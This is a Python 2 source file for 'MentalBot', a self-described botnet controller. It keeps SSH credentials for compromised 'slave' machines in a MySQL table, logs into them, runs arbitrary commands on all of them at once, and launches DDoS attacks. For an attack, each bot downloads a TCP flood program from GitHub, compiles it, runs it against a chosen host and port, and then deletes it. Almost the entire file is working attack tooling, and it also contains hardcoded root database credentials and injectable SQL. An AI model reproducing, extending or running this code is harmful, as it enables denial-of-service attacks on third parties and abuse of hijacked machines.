#!/usr/bin/env python
# Copyrights (c) 2015 >> TheStoker



try:
	import os, sys, time, socket, MySQLdb, pxssh
	sys.path.append('files/')
	from re import search
	from datetime import datetime
	from colors import COLOR
except:
	print '\n\n ---> Error in Importing Modules\n'

def banner():
	print COLOR.bold + COLOR.green + '''\n
###################################################################
#     ,-""""-.               ,-'""`-.                ,-'""`-.     #
#    /        \             ;        :              ;        :    #
#    :(_)  (_);            :          :            :          :   #
#    `   '`   '            :  _    _  ;            : (_)  (_) ;   #
#      `++++'              : ( )  ( ) :             `   '`   '    #
#       `--'               ::   '`   :;              :`++++';     #
#                           !:      :!                ``..''      #
#                           `:`++++';'                            #
#                             `....'                              #
#                                                                 #
#        MentalBot v1.0     |    Author >> TheStoker              #
# \033[0m\033[91m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m\033[92m\033[1m #
# Commands:                                                       #
#	help       : View All Commands                            #
#	show_stats : Check Database                               #
#       activate   : Set All Bots Online                          #
#       clear      : Clear the Console                            #
#	quit	   : Exit the Bot                                 #
###################################################################\n ''' + COLOR.die

def helper():
	print COLOR.bold + ''' 
 __________________________________________________________________
| help                         | View This Help                    |
|______________________________|___________________________________|
| show_stats                   | Check Database                    |
|______________________________|___________________________________|
| activate                     | Active All Bots to Work           |
|______________________________|___________________________________|
| create {host} {user} {pass}  | Add New Slave to Database         |
|______________________________|___________________________________|
| del {int Number}             | Delete A Specific Bot             |
|______________________________|___________________________________|
| destroy                      | Delete all the Bots               |
|______________________________|___________________________________|
| exec {command}               | Execute System Commands           |
|______________________________|___________________________________|
| attack {example.com} {port}  | Ddos Attack From All Slaves       |
|______________________________|___________________________________|
| stop                         | Stop Ddos attack                  |
|______________________________|___________________________________|
| quit                         | Quit The Botnet                   | 
|______________________________|___________________________________|
''' + COLOR.die

class MentalBot:
	def __init__(self, host, user, passwd):
		self.host = host
		self.user = user
		self.passwd = passwd
		self.session = self.connect()

	def connect(self):
		try:
			self.Mentalbot = pxssh.pxssh()
			self.Mentalbot.login(self.host, self.user, self.passwd)
			print COLOR.bold + '\n\n --> Bot is Online: {0}'.format(self.host) + COLOR.die
			return self.Mentalbot
		except Exception as e:
			print COLOR.red + '\n\n --> Failed: {0}'.format(self.host) + COLOR.die
		return e

	def logout(self):
		self.Mentalbot.terminate(True)
		
	def ExecCMD(self, command):
		self.session.sendline(command)
		self.session.prompt()
		return self.session.before

def MentalCommand(command):
	for client in Mental:
		output = client.ExecCMD(command)
		print COLOR.red + 'Executed >> \n\n' + COLOR.die + output

def addClient(host, user, password):
	client = MentalBot(host, user, password)
	Mental.append(client)


def table():
	query = '''
CREATE TABLE IF NOT EXISTS `bots` (
  `id` int(11) PRIMARY KEY AUTO_INCREMENT,
  `ipadr` varchar(30) NOT NULL,
  `user` varchar(30) NOT NULL,
  `password` varchar(30) NOT NULL,
  `dtstmp` timestamp
)
'''
	try:
		cursor.execute(query)
		db.commit()
	except:
		print COLOR.bold + ' --> Table Creation Exception Catched ' + COLOR.die
		pass

def InsertDB(ipadr, user, password):
	dtstmp = str(datetime.fromtimestamp(int(time.time())).strftime("%Y-%m-%d %H:%M:%S"))
	query = """INSERT INTO bots (ipadr, user, password, dtstmp) VALUES('%s', '%s', '%s', '%s')"""%(ipadr, user, password, dtstmp)
	try:
		cursor.execute(query)
		db.commit()
		print COLOR.red + '\n\n --> Database Updated' + COLOR.die
	except:
		print COLOR.bold + ' --> Insertion Exception Catched ' + COLOR.die
		pass


def addSlave():
	cursor.execute("SELECT id, ipadr, user, password, dtstmp FROM bots")
	detail = cursor.fetchall()
	for row in detail:
		addClient(row[1], row[2], row[3])

def FetchedData():
	query = """SELECT id, ipadr, user, password, dtstmp from bots"""
	try:
		cursor.execute(query)
	except:
		print COLOR.bold + ' --> Selection Exception Catched ' + COLOR.die
		pass
	try:
		dtbs = cursor.fetchall()
		for row in dtbs:
			Id = row[0]
			ipadr = row[1]
			user = row[2]
			password = row[3]
			dtstmp = row[4]
			print COLOR.bold + '''
+--------------------------------------------------------------------------------------------+
   id:%d - ipaddr:%s - user:%s - password:%s - dtstmp:%s
+--------------------------------------------------------------------------------------------+	
		'''%(Id, ipadr, user, password, dtstmp) + COLOR.die
	except:
		print COLOR.bold + ' --> Fetchall() Exception Catched ' + COLOR.die
		pass

def delOne(n):
	query = """DELETE FROM bots WHERE id={0}""".format(n)
	try:
		cursor.execute(query)
		db.commit()
	except:
		print COLOR.bold + ' --> Deleting Exception Catched ' + COLOR.die
		pass

def Truncate():
	query = """DELETE FROM bots WHERE id>0"""
	try:
		cursor.execute(query)
		db.commit()
		print COLOR.bold + ' [+] Database Removed ' + COLOR.die
	except:
		print COLOR.bold + ' --> Truncation Exception Catched ' + COLOR.die
		pass

def Attack(host, port):
	for client in Mental:
		clean()
		print COLOR.bold + ' --> Starting Attack on {0}:{1}\n'.format(host, port) + COLOR.die
		host = socket.gethostbyname(host)
		if not os.path.isfile('flood'):
			output = client.ExecCMD("wget https://raw.githubusercontent.com/phonehold/tcpflood/master/tcpflood.c")
			output = client.ExecCMD("gcc -o flood tcpflood.c")
			output = client.ExecCMD("./flood 0.0.0.0 000 {0} {1} 3 1".format(host, port))
		else:
			output = client.ExecCMD("./flood 0.0.0.0 000 {0} {1} 3 1".format(host, port))
# debugging		print output


def clean():
	for client in Mental:
		output = client.ExecCMD("rm -f tcpfl*")

def Kill():
	for client in Mental:
		output = client.logout()

def Invld():
	print COLOR.bold + '\n\n [-] Invalid Command' + COLOR.die

db = MySQLdb.connect(host='localhost', user='root', passwd='toor', db='Mentalbot')
cursor = db.cursor()
table()	

Mental = []

def main():
	while True:
		cmnd = raw_input(COLOR.bold + COLOR.red + '((MentalBot))>>> ' + COLOR.die)
		if search('activate', cmnd):
			addSlave()
			banner()
			main()
		elif search('help', cmnd):
			helper()			
			main()
		elif search('del', cmnd):
			d = map(str, cmnd.split())
			n = d[1]
			delOne(n)
			banner()
			main()
		elif search('attack', cmnd):
			dd = map(str, cmnd.split())
			dd1 = dd[1]
			dd2 = dd[2]
			Attack(dd1, dd2)
			banner()
			main()		
		elif search('create', cmnd):
			var = map(str, cmnd.split())
			ipadr = var[1]
			user = var[2]
			password = var[3]
			InsertDB(ipadr, user, password)
			banner()
			main()
		elif search('destroy', cmnd):
			Truncate()
			banner()
			main()
		elif search('show_stats', cmnd):
			FetchedData()
			banner()
			main()		
		elif search('exec', cmnd):
			x = map(str, cmnd.split())
			i = x[1]
			banner()
			MentalCommand(i)
			main()
		elif search('stop', cmnd):
			Kill()
			banner()
			main()
		elif search('clear', cmnd):
			os.system('clear')
			banner()
			main()
		elif search('quit', cmnd):
			print COLOR.red + COLOR.bold + '\n\n ---> BYE BYE' + COLOR.die
			exit()
		else:
			Invld()
			banner()
			main()

def clrscr():
	if 'linux' in sys.platform:
		os.system('clear')

if __name__ == '__main__':
	if os.getuid() != 0:
		print COLOR.red + COLOR.bold + ' ---> You are Not Root\n' + COLOR.die		
		exit()
	else:
		try:
			clrscr()
			banner()
			main()
			db.close()
		except KeyboardInterrupt:
			print COLOR.red + COLOR.bold + '\n\n ---> [CTRL+C] Detected!' + COLOR.die
			exit()
